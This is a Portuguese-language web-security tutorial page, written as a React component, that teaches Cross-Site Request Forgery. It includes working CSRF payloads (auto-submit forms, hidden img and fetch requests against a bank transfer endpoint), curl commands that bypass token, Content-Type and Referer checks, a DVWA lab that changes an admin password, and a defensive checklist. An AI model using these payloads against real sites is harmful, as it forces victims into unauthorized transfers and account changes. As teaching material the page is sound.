import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function CSRF() {
  return (
    <PageContainer
      title="CSRF — Cross-Site Request Forgery"
      subtitle="Forçar a vítima logada a executar ação no app sem perceber. Bypass de tokens e SameSite."
      difficulty="intermediário"
      timeToRead="12 min"
      prompt="web/csrf"
    >
      <h2>Como funciona</h2>
      <p>
        Vítima está logada em <code>banco.com</code>. Visita <code>atacante.com</code>.
        O HTML do atacante dispara um POST para <code>banco.com/transferir</code> usando
        o cookie de sessão automaticamente (browser anexa cookies do mesmo origin).
      </p>

      <CodeBlock
        language="html"
        title="ataque CSRF clássico (em atacante.com)"
        code={`<!-- Forma 1: form auto-submit -->
<html>
<body onload="document.f.submit()">
  <form name="f" action="https://banco.com/transferir" method="POST">
    <input type="hidden" name="conta_dest" value="999.999-9">
    <input type="hidden" name="valor" value="5000">
  </form>
</body>
</html>

<!-- Forma 2: GET via image/iframe -->
<img src="https://banco.com/transferir?dest=999&valor=5000">

<!-- Forma 3: XHR/fetch via JS (precisa CORS permissivo) -->
<script>
  fetch('https://banco.com/transferir', {
    method: 'POST',
    credentials: 'include',
    body: 'dest=999&valor=5000'
  });
</script>`}
      />

      <h2>Identificação manual</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) capture o request da ação sensível (Burp History)",
            cmd: "(no Burp, aba History, encontre POST /transferir)",
            out: `POST /transferir HTTP/2
Host: banco.com
Cookie: session=eyJ1c2VyIjogOTl9
Content-Type: application/x-www-form-urlencoded

conta_dest=12345&valor=100`,
            outType: "info",
          },
          {
            comment: "2) procure: existe TOKEN único por request? (csrf_token, _token, authenticity_token)",
            cmd: "(se NÃO tem, é CSRF clássico)",
            out: "Vulnerável.",
            outType: "warning",
          },
          {
            comment: "3) o cookie tem SameSite?",
            cmd: "curl -sI https://banco.com/login | grep -i set-cookie",
            out: `Set-Cookie: session=eyJ...; Path=/; HttpOnly`,
            outType: "error",
          },
        ]}
      />

      <p>
        <strong>Sem SameSite</strong>, o cookie é enviado em qualquer cross-site POST.
        Default moderno dos browsers é <code>SameSite=Lax</code> — mas muitos apps configuram explicitamente.
      </p>

      <h2>POC HTML — gerador automático no Burp</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "(no Burp, right-click no request → Engagement Tools → Generate CSRF PoC)",
            out: `<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://banco.com/transferir" method="POST">
      <input type="hidden" name="conta&#95;dest" value="12345" />
      <input type="hidden" name="valor" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>`,
            outType: "info",
          },
        ]}
      />

      <h2>Bypass — token presente mas validado mal</h2>
      <CommandTable
        title="Falhas comuns de validação"
        variations={[
          { cmd: "Token só validado se presente", desc: "Apague o parâmetro do request — passa.", output: "Servidor: 'if (token) check(token)'." },
          { cmd: "Token validado mas não vinculado ao usuário", desc: "Use SEU token na ação da vítima.", output: "Atacante usa próprio _csrf no form para vítima." },
          { cmd: "Token em cookie, não em header", desc: "Atacante define cookie via XSS/MitM.", output: "Cookie csrf não protege CSRF se vai junto." },
          { cmd: "Token previsível (sequencial)", desc: "Pode adivinhar o próximo.", output: "Hash MD5 do user_id, ts, etc." },
          { cmd: "Validar apenas em POST (GET muda estado)", desc: "Use GET com mesmo efeito.", output: "GET /transferir?d=x&v=100 (pior caso)." },
          { cmd: "Token compartilhado entre subdomínios sem domínio limitado", desc: "subdomain XSS rouba token.", output: "Cookie: Domain=.empresa.com" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "tentar request SEM o token (alguns apps deixam passar)",
            cmd: `curl -X POST https://app.local/transferir \\
  -b 'session=eyJ...' \\
  -d 'conta_dest=12345&valor=100'`,
            out: `HTTP/2 302
Location: /sucesso?id=42`,
            outType: "warning",
          },
          {
            comment: "tentar trocar POST por GET",
            cmd: "curl 'https://app.local/transferir?conta_dest=12345&valor=100' -b 'session=eyJ...'",
            out: `HTTP/2 302    ← idem!  vulnerável a CSRF via simples <img>`,
            outType: "error",
          },
        ]}
      />

      <h2>Bypass — Content-Type</h2>
      <p>
        Apps que checam <code>Content-Type: application/json</code> como "proteção CSRF"
        (porque um <code>&lt;form&gt;</code> nativo só envia x-www-form-urlencoded) podem ser
        burlados quando o servidor aceita o body em qualquer Content-Type.
      </p>

      <CodeBlock
        language="html"
        title="enviar JSON via form usando text/plain"
        code={`<form action="https://api.app.local/transferir" method="POST" enctype="text/plain">
  <input name='{"conta_dest":"12345","valor":100,"x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>

<!-- O body REAL enviado vira:
     {"conta_dest":"12345","valor":100,"x":"="}
     que JSON.parse aceita -->`}
      />

      <h2>Bypass — referer não validado</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "alguns apps validam Referer mas mal:",
            cmd: "curl -X POST https://app.local/admin -H 'Referer: https://app.local.atacante.com/' -b 'session=eyJ...' -d 'action=delete&id=1'",
            out: "HTTP/2 200 (passou — checa só substring 'app.local')",
            outType: "warning",
          },
          {
            comment: "ou validar via path:",
            cmd: "curl -X POST https://app.local/admin -H 'Referer: https://atacante.com/?app.local' -b 'session=eyJ...' -d '...'",
            out: "(bypass se a checagem é regex frouxa)",
            outType: "default",
          },
        ]}
      />

      <h2>SameSite — quando ajuda</h2>
      <CommandTable
        title="Diretivas SameSite do cookie"
        variations={[
          { cmd: "SameSite=Strict", desc: "Cookie NÃO vai em NENHUM cross-site (nem em links!).", output: "Mais seguro, pior UX." },
          { cmd: "SameSite=Lax", desc: "Cookie vai em GET top-level cross-site (clicar link).", output: "Default moderno dos browsers." },
          { cmd: "SameSite=None; Secure", desc: "Cookie vai em qualquer cross-site (precisa HTTPS).", output: "Necessário para 3rd-party SSO." },
          { cmd: "(sem SameSite)", desc: "Browsers modernos aplicam Lax por default.", output: "Defesa parcial 'gratuita'." },
        ]}
      />

      <h2>Defesa correta</h2>
      <CodeBlock
        language="text"
        title="checklist anti-CSRF (servidor)"
        code={`✓ Cookies de sessão com SameSite=Lax (mínimo) ou Strict
✓ Cookie HttpOnly + Secure
✓ Token CSRF único por usuário e por request (synchronizer pattern)
   - Inserir em <input type="hidden" name="_csrf">
   - Validar em todo POST/PUT/DELETE/PATCH
   - Vincular ao session ID
✓ Validar Origin / Referer header em ações sensíveis
✓ Para APIs: exigir header X-Requested-With (não pode ser setado cross-origin sem CORS)
✓ Usar PUT/DELETE em REST (form HTML não dispara naturalmente)
✓ Reauth para ações críticas (transferência, mudança de senha, exclusão de conta)`}
      />

      <PracticeBox
        title="CSRF em DVWA"
        goal="Trocar a senha do admin via CSRF no DVWA Low (sem token)."
        steps={[
          "Em DVWA dificuldade Low, vá em CSRF.",
          "Capture o request normal de troca de senha.",
          "Crie um HTML em /tmp/csrf.html com <img> apontando para o GET de troca.",
          "Hospede em python3 -m http.server.",
          "Em outra aba já logada, abra o csrf.html — a senha muda.",
        ]}
        command={`cat > /tmp/csrf.html << 'EOF'
<html><body>
  <h1>Site inocente</h1>
  <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
       width="0" height="0">
</body></html>
EOF

cd /tmp && python3 -m http.server 9000 &

# Em outra aba (já logado em DVWA):
firefox http://localhost:9000/csrf.html

# Verifica que senha mudou:
curl -X POST http://localhost:8080/login.php -d 'username=admin&password=hacked&Login=Login' -L -c cookies.txt`}
        expected={`(o cookies.txt deve mostrar session bem-sucedida com a NOVA senha 'hacked')`}
        verify="Faça logout e tente login com admin/hacked — deve funcionar (e admin/password agora falha)."
      />

      <AlertBox type="danger" title="CSRF + XSS = take-over total">
        Quando há XSS no app, CSRF torna-se trivial: o atacante já está dentro do origin
        e pode ler tokens, mudar formulários, fazer qualquer ação. Por isso XSS é
        sempre tratado como CRITICAL — mesmo "reflected".
      </AlertBox>
    </PageContainer>
  );
}
